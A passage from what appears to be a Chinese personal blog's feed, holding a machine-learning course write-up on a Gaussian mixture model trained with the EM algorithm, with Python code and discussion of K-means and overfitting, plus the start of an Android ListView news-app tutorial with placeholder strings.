找一个人脸数据（小点样本量），用你实现PCA方法对该数据降维，找出一些主成分，然后用这些主成分对每一副人脸图像进行重建，比较一些它们与原图像有多大差别（用信噪比衡量）。

实验准备
降维的必要
多重共线性–预测变量之间相互关联。多重共线性会导致解空间的不稳定，从而可能导致结果的不连贯。

高维空间本身具有稀疏性。一维正态分布有
    
    </summary>
    
      <category term="Machine Learning" scheme="http://home.meng.uno/categories/Machine-Learning/"/>
    
    
      <category term="机器学习" scheme="http://home.meng.uno/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="主成分分析" scheme="http://home.meng.uno/tags/%E4%B8%BB%E6%88%90%E5%88%86%E5%88%86%E6%9E%90/"/>
    
      <category term="PCA" scheme="http://home.meng.uno/tags/PCA/"/>
    
  </entry>
  
  <entry>
    <title>使用EM算法优化的GMM</title>
    <link href="http://home.meng.uno/articles/177fbbcc/"/>
    <id>http://home.meng.uno/articles/177fbbcc/</id>
    <published>2016-12-17T03:16:53.000Z</published>
    <updated>2020-12-02T01:47:22.000Z</updated>
    
    <content type="html"><![CDATA[<p>先上代码：</p><figure class="highlight stylus">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre>      </td>      <td class="code">        <pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">import numpy as np</span><br><span class="line">import matplotlib<span class="selector-class">.pyplot</span> as mat</span><br><span class="line">import matplotlib<span class="selector-class">.mlab</span> as mlab</span><br><span class="line">#EM算法</span><br><span class="line">def EM(dataSet,K):</span><br><span class="line">    (N, M) = np.shape(dataSet)</span><br><span class="line">    W = np.zeros([N, K])</span><br><span class="line">    P= N/K</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> range(K):</span><br><span class="line">        W[np.floor(k*P):np.floor((k+<span class="number">1</span>)*P), k] = <span class="number">1</span></span><br><span class="line">    A,M,S = Mstep(dataSet,W)</span><br><span class="line">    return W, A, M, S</span><br><span class="line">#M的跨度</span><br><span class="line">def Mstep(data,W):</span><br><span class="line">    (N, M) = np.shape(data)</span><br><span class="line">    K = np.size(W,<span class="number">1</span>) </span><br><span class="line">    Nk = np.sum(W,<span class="number">0</span>)</span><br><span class="line">    A = Nk/np.sum(Nk)</span><br><span class="line">    Mm = data<span class="selector-class">.T</span><span class="selector-class">.dot</span>(W).dot(np.diag(np.reciprocal(Nk)))</span><br><span class="line">    S = np.zeros([M,M,K])</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> range(K):</span><br><span class="line">        datMean = data<span class="selector-class">.T</span> - Mm[<span class="number">0</span>:,k][None]<span class="selector-class">.T</span><span class="selector-class">.dot</span>(np.ones([<span class="number">1</span>,N]))</span><br><span class="line">        S[:,:,k] = (datMean.dot(np.diag(W[<span class="number">0</span>:,k])).dot(datMean.T))/Nk[k]</span><br><span class="line">    return A,Mm,S</span><br><span class="line">#E的跨度</span><br><span class="line">def Estep(data,A,M,S):</span><br><span class="line">    N = np.size(data,<span class="number">0</span>)</span><br><span class="line">    K = np.size(A)</span><br><span class="line">    W = np.zeros([N,K])</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> range(K):</span><br><span class="line">        <span class="keyword">for</span> <span class="selector-tag">i</span> <span class="keyword">in</span> range(N):</span><br><span class="line">            W[<span class="selector-tag">i</span>,k] = A[k]*multivariate(data[<span class="selector-tag">i</span>,:][None]<span class="selector-class">.T</span>, \</span><br><span class="line">                     M[:,k][None]<span class="selector-class">.T</span>,S[:,:,k])</span><br><span class="line">    W = W*np.reciprocal(np.sum(W,<span class="number">1</span>)[None].T)</span><br><span class="line">    return W</span><br><span class="line">def multivariate(x, m, s):</span><br><span class="line">    <span class="keyword">if</span> len(x) == len(m) and (len(x), len(x)) == s<span class="selector-class">.shape</span>:</span><br><span class="line">        det = np<span class="selector-class">.linalg</span><span class="selector-class">.det</span>(s)</span><br><span class="line">        const = 1.0/(np.math.pow((2*np.pi), float(len(x))/2) * np.math.pow(det, 1.0/2))</span><br><span class="line">        x_m = np.matrix(x - m)</span><br><span class="line">        inv_ = np<span class="selector-class">.linalg</span><span class="selector-class">.inv</span>(s)</span><br><span class="line">        result = np.math.pow(np.math.e, -0.5 * (x_m.T * inv_ * x_m))</span><br><span class="line">        return const * result</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        return -<span class="number">1</span></span><br><span class="line">#GMM主程序</span><br><span class="line">def GMM():</span><br><span class="line">    # 加载文件</span><br><span class="line">    input_file = open(<span class="string">'points.dat'</span>)</span><br><span class="line">    lines = input_file.readlines()</span><br><span class="line">    Data = np.array([line.strip().split() <span class="keyword">for</span> line <span class="keyword">in</span> lines]).astype(np.<span class="attribute">float</span>)</span><br><span class="line">    (x, y) = np.shape(Data)</span><br><span class="line">    mat.draw()</span><br><span class="line">    mat.pause(<span class="number">0.01</span>)</span><br><span class="line">    mat.subplot(<span class="number">111</span>)</span><br><span class="line">    mat.plot(x, y, <span class="string">'b*'</span>)</span><br><span class="line">    learn = Data[np<span class="selector-class">.math</span><span class="selector-class">.ceil</span>(x*<span class="number">0.8</span>):x, <span class="number">0</span>:]</span><br><span class="line">    train = Data[:np<span class="selector-class">.math</span><span class="selector-class">.floor</span>(x*<span class="number">0.8</span>), <span class="number">0</span>:]</span><br><span class="line">    trainnum = <span class="number">16</span></span><br><span class="line">    (W, Alpha, Mu, Sigma) = EM(train,trainnum)</span><br><span class="line">    m = np.arange(-<span class="number">4.0</span>, <span class="number">4.0</span>, <span class="number">0.1</span>)</span><br><span class="line">    n = np.arange(-<span class="number">4.0</span>, <span class="number">4.0</span>, <span class="number">0.1</span>)</span><br><span class="line">    ax, ay = np.meshgrid(m, n)</span><br><span class="line">    <span class="selector-tag">i</span> = <span class="number">0</span></span><br><span class="line">    prev = -<span class="number">9999</span></span><br><span class="line">    mat.clf()</span><br><span class="line">    while(True):    </span><br><span class="line">        <span class="keyword">if</span>(False):</span><br><span class="line">            SigmaSum = np.sum(Sigma,<span class="number">2</span>)</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> range(trainnum):</span><br><span class="line">                Sigma[:,:,k] = SigmaSum</span><br><span class="line">        W = Estep(train,Alpha,Mu,Sigma)</span><br><span class="line">        Alpha,Mu,Sigma = Mstep(train,W)</span><br><span class="line">       # trains = logLike(train,Alpha,Mu,Sigma)</span><br><span class="line">        N,M = np.shape(train)</span><br><span class="line">        P = np.zeros([N,len(Alpha)])</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> range(len(Alpha)):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(N):</span><br><span class="line">                P[j,k] = multivariate(train[j,:][None]<span class="selector-class">.T</span>,Mu[<span class="number">0</span>:,k][None]<span class="selector-class">.T</span>,Sigma[:,:,k])</span><br><span class="line">        trains = np.sum(np.log(P.dot(Alpha)))</span><br><span class="line">        <span class="selector-tag">i</span> = <span class="selector-tag">i</span> + <span class="number">1</span></span><br><span class="line">        #画图，训练和测试样本</span><br><span class="line">        mat.subplot(<span class="number">211</span>)</span><br><span class="line">        mat.scatter(train[<span class="number">0</span>:,<span class="number">0</span>],train[<span class="number">0</span>:,<span class="number">1</span>])</span><br><span class="line">        mat.hold(True)</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">0</span>, trainnum):</span><br><span class="line">            az = mlab.bivariate_normal(ax, ay, Sigma[<span class="number">0</span>, <span class="number">0</span>, k], Sigma[<span class="number">1</span>, \</span><br><span class="line">                <span class="number">1</span>, k], Mu[<span class="number">0</span>,k], Mu[<span class="number">1</span>,k], Sigma[<span class="number">1</span>, <span class="number">0</span>, k])</span><br><span class="line">            try:</span><br><span class="line">                mat.contour(ax, ay, az)</span><br><span class="line">            except:</span><br><span class="line">                continue</span><br><span class="line">        mat.hold(False)</span><br><span class="line">        # Render these</span><br><span class="line">        mat.draw()</span><br><span class="line">        mat.pause(<span class="number">0.01</span>)</span><br><span class="line">        mat.subplot(<span class="number">212</span>)</span><br><span class="line">        mat.scatter(learn[<span class="number">0</span>:,<span class="number">0</span>],learn[<span class="number">0</span>:,<span class="number">1</span>])</span><br><span class="line">        mat.hold(True)</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">0</span>, trainnum):</span><br><span class="line">            az = mlab.bivariate_normal(ax, ay, Sigma[<span class="number">0</span>, <span class="number">0</span>, k], Sigma[<span class="number">1</span>, \</span><br><span class="line">                <span class="number">1</span>, k], Mu[<span class="number">0</span>,k], Mu[<span class="number">1</span>,k], Sigma[<span class="number">1</span>, <span class="number">0</span>, k])</span><br><span class="line">            try:</span><br><span class="line">                mat.contour(ax, ay, az)</span><br><span class="line">            except:</span><br><span class="line">                continue</span><br><span class="line">        mat.hold(False)</span><br><span class="line">        <span class="keyword">if</span>(i&gt;<span class="number">150</span> or abs(trains - prev)&lt; <span class="number">0.01</span>):</span><br><span class="line">            break</span><br><span class="line">        prev = trains</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    GMM()</span><br></pre>      </td>    </tr>  </table></figure><h2 id="实验要求">实验要求</h2><h3 id="实验目标">实验目标</h3><p>实现一个混合高斯模型，并且用EM算法估计模型中的参数。</p><h3 id="实验过程">实验过程</h3><p>用混合高斯模型产生k个高斯分布的数据（其中参数自己设定），然后用你实现的EM算法估计参数，看看每次迭代后似然值变化情况，考察EM算法是否可以获得正确的结果（与你设定的结果比较）。 可以UCI上找一个简单问题数据，用你实现的GMM进行聚类。</p><h2 id="算法原理">算法原理</h2><h3 id="gmm算法">GMM算法</h3><p>高斯模型就是用高斯概率密度函数（正态分布曲线）精确地量化事物，将一个事物分解为若干的基于高斯概率密度函数（正态分布曲线）形成的模型。</p><p>对图像背景建立高斯模型的原理及过程：图像灰度直方图反映的是图像中某个灰度值出现的频次，也可以认为是图像灰度概率密度的估计。如果图像所包含的目标区域和背景区域相比比较大，且背景区域和目标区域在灰度上有一定的差异，那么该图像的灰度直方图呈现双峰-谷形状，其中一个峰对应于目标，另一个峰对应于背景的中心灰度。对于复杂的图像，尤其是医学图像，一般是多峰的。通过将直方图的多峰特性看作是多个高斯分布的叠加，可以解决图像的分割问题。 在智能监控系统中，对于运动目标的检测是中心内容，而在运动目标检测提取中，背景目标对于目标的识别和跟踪至关重要。而建模正是背景目标提取的一个重要环节。</p><p>我们首先要提起背景和前景的概念，前景是指在假设背景为静止的情况下，任何有意义的运动物体即为前景。建模的基本思想是从当前帧中提取前景，其目的是使背景更接近当前视频帧的背景。即利用当前帧和视频序列中的当前背景帧进行加权平均来更新背景,但是由于光照突变以及其他外界环境的影响，一般的建模后的背景并非十分干净清晰，而高斯混合模型是是建模最为成功的方法之一。</p><p>混合高斯模型使用K（基本为3到5个）个高斯模型来表征图像中各个像素点的特征,在新一帧图像获得后更新混合高斯模型, 用当前图像中的每个像素点与混合高斯模型匹配,如果成功则判定该点为背景点, 否则为前景点。</p><p>通观整个高斯模型，主要是有方差和均值两个参数决定，对均值和方差的学习，采取不同的学习机制,将直接影响到模型的稳定性、精确性和收敛性 。由于我们是对运动目标的背景提取建模，因此需要对高斯模型中方差和均值两个参数实时更新。为提高模型的学习能力,改进方法对均值和方差的更新采用不同的学习率;为提高在繁忙的场景下,大而慢的运动目标的检测效果,引入权值均值的概念,建立背景图像并实时更新,然后结合权值、权值均值和背景图像对像素点进行前景和背景的分类。</p><p>具体实现过程：</p><ol>  <li>为图像的每个像素点指定一个初始的均值、标准差以及权重。</li>  <li>收集N（一般取200以上，否则很难得到像样的结果）帧图像利用在线EM算法得到每个像 素点的均值、标准差以及权重。</li>  <li>从N+1帧开始检测，检测的方法： 对每个像素点：    <ol>      <li>将所有的高斯核按照 ω / σ 降序排序</li>      <li>选择满足下式的前M个高斯核：M = arg min(ω / σ &gt; T)</li>      <li>如果当前像素点的像素值在中有一个满足：就可以认为其为背景点。</li>    </ol>  </li>  <li>更新背景图像，用EM算法。</li></ol><h3 id="em算法">EM算法</h3><p>EM 算法是 Dempster，Laind，Rubin 于 1977 年提出的求参数极大似然估计的一种方法，它可以从非完整数据集中对参数进行 MLE 估计，是一种非常简单实用的学习算法。这种方法可以广泛地应用于处理缺损数据，截尾数据，带有噪声等所谓的不完全数据(incomplete data)。</p><p>最大期望算法经过两个步骤交替进行计算：</p><ul>  <li>第一步是计算期望（E），利用对隐藏变量的现有估计值，计算其最大似然估计值；</li>  <li>第二步是最大化（M），最大化在 E 步上求得的最大似然值来计算参数的值。</li></ul><p>M 步上找到的参数估计值被用于下一个 E 步计算中，这个过程不断交替进行。</p><p>通过交替使用这两个步骤，EM算法逐步改进模型的参数，使参数和训练样本的似然概率逐渐增大，最后终止于一个极大点。直观地理解EM算法，它也可被看作为一个逐次逼近算法：事先并不知道模型的参数，可以随机的选择一套参数或者事先粗略地给定某个初始参数λ0 ，确定出对应于这组参数的最可能的状态，计算每个训练样本的可能结果的概率，在当前的状态下再由样本对参数修正，重新估计参数λ，并在新的参数下重新确定模型的状态，这样，通过多次的迭代，循环直至某个收敛条件满足为止，就可以使得模型的参数逐渐逼近真实参数。</p><p>具体实现步骤：</p><ul>  <li>给出种类数k,初始化每一类高斯分布的均值μk，方差∑k以及每一类的概率πk；</li>  <li>执行EM；</li>  <li>计算似然，如果没有达到预期效果，则返回第2步；</li>  <li>计算每个数据点对于k个高斯分布的似然，选择似然最大的一类作为数据的最终分类。</li></ul><p>其他的混合模型，例如朴素贝叶斯混合模型也是可以使用EM算法推出使用的，这一算法虽然在GMM中作为参数使用，但是其仍然可以单独发挥作用。我觉得EM算法就是相互迭代（毕竟其由E和M两部分组成嘛），求出一个稳定值，而这种相互迭代的方法用的范围挺广的，例如混合模型，K-means等都需要使用。</p><h3 id="与k-means的区别">与K-means的区别</h3><p>在上文我也已经提到了EM算法可以用在K-means等其他需要迭代的方法上的事实，其实，我觉得GMM 和 K-means 很像，只不过后者要简单，而且相对来说实现并不是很高效。不过 GMM 是学习出一些概率密度函数来（所以 GMM 除了用在 clustering 上之外，还经常被用于 density estimation ），简单地说，K-means 的结果是每个数据点被 assign 到其中某一个 cluster 了，而 GMM 则给出这些数据点被 assign 到每个 cluster 的概率，又称作  soft assignment。</p><h2 id="实验环境">实验环境</h2><p>Spyder 作为Python开发的集成开发环境； 编程语言：Python 3.5； 操作系统：macOS Sierra。</p><h2 id="小结">小结</h2><p>GMM算法作为EM算法族的一个例子，它指定了各个参与杂合的分布都是高斯分布，即分布参数表现为均值Mu和方差Sigma。通过EM算法作为计算使用的框架，迭代地算出各个高斯分布的参数。</p><h3 id="gmm与k-means的思考">GMM与K-means的思考</h3><p>提到GMM不得不提K-means，总结了网上的资料以及老师上课的课件，我将两者的区别与联系陈述如下：</p><ul>  <li>两者的联系:</li></ul><p>都是迭代执行的算法，且迭代的策略也相同：算法开始执行时先对需要计算的参数赋初值，然后交替执行两个步骤，一个步骤是对数据的估计（k-means是估计每个点所属簇；GMM是计算隐含变量的期望）；第二步是用上一步算出的估计值重新计算参数值，更新目标参数（k-means是计算簇心位置；GMM是计算各个高斯分布的中心位置和协方差矩阵）</p><ul>  <li>两者的区别:</li></ul><p>首先，两者需要计算的参数不同：K-means是簇心位置；GMM是各个高斯分布的参数；其次，两者计算目标参数的方法不同：K-means是计算当前簇中所有元素的位置的均值；GMM是基于概率的算法，是通过计算似然函数的最大值实现分布参数的求解的。</p><h3 id="关于gmm引发的过拟合的思考">关于GMM引发的过拟合的思考</h3><p>首先我想提到这样的一个“人辨认其他生物（例如鱼）”的例子。当我们被告知水里游的那个生物是鱼之后，我们会使用“在同样的地方生活的是同一种东西”这类似的假设，归纳出“在水里游的都是鱼”这样一个结论。当然这个过程是完全“本能”的，如果不仔细去想，我们也不会了解自己是怎样“认识鱼”的。另一个值得注意的地方是这样的假设并不总是完全正确的，甚至可以说总是会有这样那样的缺陷的，因为我们有可能会把虾、龟、甚至是潜水员当做鱼。也许你觉得可以通过修改前提假设来解决这个问题，例如，基于“生活在同样的地方并且穿着同样衣服的是同一种东西”这个假设，你得出结论：在水里有并且身上长有鳞片的是鱼。可是这样还是有问题，因为有些没有长鳞片的鱼现在又被你排除在外了。</p><p>机器在识别方面面临着和人一样的问题，在机器学习中，一个学习算法也会有一个前提假设，这里被称作“归纳偏执”。例如线性回归，目的是要找一个函数尽可能好地拟合给定的数据点，它的归纳偏执就是“满足要求的函数必须是线性函数”。一个没有归纳偏执的学习算法从某种意义上来说毫无用处，就像一个完全没有归纳能力的人一样，在第一次看到鱼的时候有人告诉他那是鱼，下次看到另一条鱼了，他并不知道那也是鱼，因为两条鱼总有一些地方不一样的，或者就算是同一条鱼，在河里不同的地方看到，或者只是看到的时间不一样，也会被他认为是不同的，因为他无法归纳，无法提取主要矛盾、忽略次要因素，只好要求所有的条件都完全一样──然而哲学家已经告诉过我们了：世界上不会有任何样东西是完全一样的，所以这个人即使是有无比强悍的记忆力，也绝学不到任何一点知识。</p><p>于是有了上面的铺垫，我们就可以引出论题——“过拟合 ”，就像前面的回归的问题，如果去掉“线性函数”这个归纳偏执，因为对于 N 个点，我们总是可以构造一个 N-1 次多项式函数，让它完美地穿过所有的这 N 个点，或者如果我用任何大于 N-1 次的多项式函数的话，我们甚至可以构造出无穷多个满足条件的函数出来。如果假定特定领域里的问题所给定的数据个数总是有个上限的话，我可以取一个足够大的 N ，从而得到一个（或者无穷多个）“超级函数”，能够拟合这个领域内所有的问题。</p><p>没有归纳偏执或者归纳偏执太宽泛会导致过拟合 ，然而另一个极端──限制过大的归纳偏执也是有问题的：如果数据本身并不是线性的，强行用线性函数去做回归通常并不能得到好结果（例如我在“实验一：多项式拟合曲线”中就做过相应的测试）。难点正在于在这之间寻找一个临界点。不过我们在这里相对于机器来说有一个很大的优势：人通常不会孤立地用某一个独立的系统和模型去处理问题，一个人每天都会从各个来源获取大量的信息，并且通过各种手段进行整合处理，归纳所得的所有知识最终得以统一地存储起来，并能有机地组合起来去解决特定的问题。</p><p>以上就是我关于“过拟合”的一点不全面的思考！</p><p><br><br>本文链接： <a href="http://home.meng.uno/articles/177fbbcc/">http://home.meng.uno/articles/177fbbcc/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      先上代码：

1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
1
    
    </summary>
    
      <category term="Machine Learning" scheme="http://home.meng.uno/categories/Machine-Learning/"/>
    
    
      <category term="机器学习" scheme="http://home.meng.uno/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>Android新闻软件编写</title>
    <link href="http://home.meng.uno/articles/8fb3f6d8/"/>
    <id>http://home.meng.uno/articles/8fb3f6d8/</id>
    <published>2016-12-16T07:01:14.000Z</published>
    <updated>2020-12-02T01:40:58.000Z</updated>
    
    <content type="html"><![CDATA[<p>当我开始学安卓开发时，我发现网上最多的教程就是关于Android上的新闻客户端开发的（而且课时特别长），我本人觉得完全是那些上传网课的人想拉时长牟利，在写完listview之后，因为我们的《软设》项目需要，我也来做做“新闻页”，我只写显示过程（不涉及爬虫），只是为了记录下开发过程供初学者及日后自己回顾。 首先，我在values/string目录加上如下条目，用作显示（内容无关）：</p><figure class="highlight stylus">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre>      </td>      <td class="code">        <pre><span class="line">&lt;string name="title"&gt;是上帝除四害是的次数不多是彻底那就是地产表示比不对是不死都今?&lt;/string&gt;</span><br><span class="line">   &lt;string name=<span class="string">"text"</span>&gt;我是测手术储备货币结算你说的内存金士顿内存就剧场那就看到手残你从从今年刷卡才能加内存显卡才能收到你今年的你朝鲜才能常出现从侠客行朝鲜&lt;/string&gt;</span><br><span class="line">   &lt;string-array name=<span class="string">"text_arr"</span>&gt;</span><br><span class="line">       &lt;item&gt;bids比貂蝉死不打算比赛的buds不v电话苏帮你吧报错还加班猝死地产表示出版社u白崇禧必须&lt;/item&gt;</span><br><span class="line">       &lt;item&gt;但是不撒手撒就行字数限制到<span class="number">6</span>个字，多的用省略号，是设置什么属学校决定停止晚自习，我和同学一起回荚冬</span><br><span class="line">              我是在那次孝雅之星的事迹报告会上认识她的。当轮到她上场的时候，主持人这样说道：“她是一个外表刚强，内心柔弱的人。”话音刚落，她班上的同学一阵哄堂大笑。</span><br><span class="line">           我用疑惑的眼神看了看身旁的同学，她告诉我，在她们班上谁都知道她是一个标准的女汉子。她的话勾起了我的好奇心，使我有了想听听她的故事的欲望。</span><br><span class="line">              她步履坚定的走上了演讲台，先是向我们深深地鞠了一躬，便开始娓娓道来她的事迹。</span><br><span class="line">              她的父母都在外打拼，忙于事业，所以很少有空去照顾她，所以家中的一切只能由她一人包办。后来，她又有了一个妹妹，致使她身上的担子又加重了许多，但她依然十分</span><br><span class="line">           坚强的承担这一切。她说妹妹的到来对于她来说像一个天使一样美好，而并不是觉得她是一个负担。当我们回到家中扑在父母怀里撒娇时，她在床头哄着妹妹入睡；当我作文网</span><br><span class="line">           http:<span class="comment">//wwW.zuoWen8.Com/们安稳的进入梦乡时，她却还在奋笔疾书。夜的黑暗与漫长，只有她才知道；思念的感受有多浓稠，只有她才知道；内心的压抑有多难受，只有她才知</span></span><br><span class="line">           道。</span><br><span class="line">              当她说到妹妹因调皮将很烫的饭菜洒到她的手臂上，她还得继续给妹妹喂饭时，当她提及妹妹做坏事后她忍气吞声的到别人家中道歉时，她哽咽了，将头扭到一边独自抹眼泪。</span><br><span class="line">           我们沉默了，低头不语。忧伤的气息迅速在全场蔓延，每个人的心都在和她共鸣着，有好几次，她正准备开口时，却都卡在了喉咙，全场为她响起了雷鸣般经久不息的掌声。</span><br><span class="line">       &lt;/item&gt;</span><br><span class="line">       &lt;item&gt;看到他我想到了爸爸，幸好他今天不上班，不用冒那么大的雪，假如哪个人是我爸爸，我多么希看有一个好心人上前伸出一只手，帮他一把。假如那是你，&lt;/item&gt;</span><br><span class="line">       &lt;item&gt;我停了车子，想往帮助他，可我也象那些来来往往的行人一样，脚步并没有动，的确有很多人同情他，同情也的确对他没用，他还是站不起来，一遍一遍看他起来又摔倒，只好转过头，</span><br><span class="line">           不看他，疼痛无奈，一个中年男子的窘态在众人眼前暴露无遗，这时的他没有一点男子汉的心胸。&lt;/item&gt;</span><br><span class="line">       &lt;item&gt;走到一个小岔路口时，我看到路的另一边一个中年男子坐在地上，他穿着青色衣服，双手扶地，似乎挣扎着坐起来，一次又一次尝试着。旁边躺着他的尽看的大梁自行车，等待着主人扶</span><br><span class="line">           起它，在这路上最难过的就是他们了吧！也只有他们可以相互安慰。&lt;/item&gt;</span><br><span class="line">       &lt;item&gt;春天，春姑娘带来了蒙蒙细雨和柔和的春风，并把它们化作一只大画笔，把绿色涂在草坪上。这时，无数只小燕子从远方飞来，在草坪上飞来飞去。&lt;/item&gt;</span><br><span class="line">       &lt;item&gt;夏天，草坪旁的花坛里，月季花欣然怒放，引来了勤劳的小蜜蜂和翩翩起舞的蝴蝶，热闹极了。&lt;/item&gt;</span><br><span class="line">       &lt;item&gt;冬天，雪花落到草坪上，给草坪盖上了一层厚厚的棉被，来年，小草更加茁壮成长。&lt;/item&gt;</span><br><span class="line">       &lt;item&gt;草坪就像一个氧气袋，它通过光合作用，净化空气，美化环境。我们要爱护学校的草坪。&lt;/item&gt;</span><br><span class="line">   &lt;/string-array&gt;</span><br><span class="line">   &lt;string-array name=<span class="string">"title_arr"</span>&gt;</span><br><span class="line">       &lt;item&gt;死地产表示出版社u白崇禧必须&lt;/item&gt;</span><br><span class="line">       &lt;item&gt;停止晚自习，我和同学一起回荚冬&lt;/item&gt;</span><br><span class="line">       &lt;item&gt;假如哪个人是我爸爸，我多么希看有一个好心人上前伸出一只手，帮他一把。假如那是你，&lt;/item&gt;</span><br><span class="line">       &lt;item&gt;我停了的行人一样，脚步并没有动，的确有很多人同情他，同情也的确对他没用，他还是站不起来，一遍一遍看他起来又摔倒，只好转过头，他没有一点男子汉的心胸。&lt;/item&gt;</span><br><span class="line">       &lt;item&gt;他穿着青色衣服，双手扶地，似乎挣扎着坐起来，一次又一次尝试着。旁边躺着他的尽看的大梁自行车，等待着主人扶&lt;/item&gt;</span><br><span class="line">       &lt;item&gt;春天。&lt;/item&gt;</span><br><span class="line">       &lt;item&gt;夏天极了。&lt;/item&gt;</span><br><span class="line">       &lt;item&gt;冬天，雪花落到&lt;/item&gt;</span><br><span class="line">       &lt;item&gt;草坪就像的草坪。&lt;/item&gt;</span><br><span class="line">   &lt;/string-array&gt;</span><br></pre>      </td>    </tr>  </table></figure><p>接着编写显示主界面：</p><figure class="highlight stylus">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre>      </td>      <td class="code">        <pre><span class="line">public class MainActivity extends AppCompatActivity&#123;</span><br><span class="line">    private ListView listview;</span><br><span class="line">    <span class="comment">//private ArrayAdapter&lt;String&gt;arr_adapter;</span></span><br><span class="line">    private SimpleAdapter simp_Adapter;</span><br><span class="line">    private List&lt;Map&lt;String,String&gt;&gt;datalist;</span><br><span class="line">    @Override</span><br><span class="line">    protected void onCreate(Bundle savedInstanceState) &#123;</span><br><span class="line">        super.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        listview = (ListView)findViewById(R.id.listview);</span><br><span class="line">        datalist = new ArrayList&lt;Map&lt;String,String&gt;&gt;();</span><br><span class="line">        simp_Adapter = new SimpleAdapter(this,getData(),R<span class="selector-class">.layout</span><span class="selector-class">.item</span>,</span><br><span class="line">                new String[]&#123;"title","text"&#125;,new 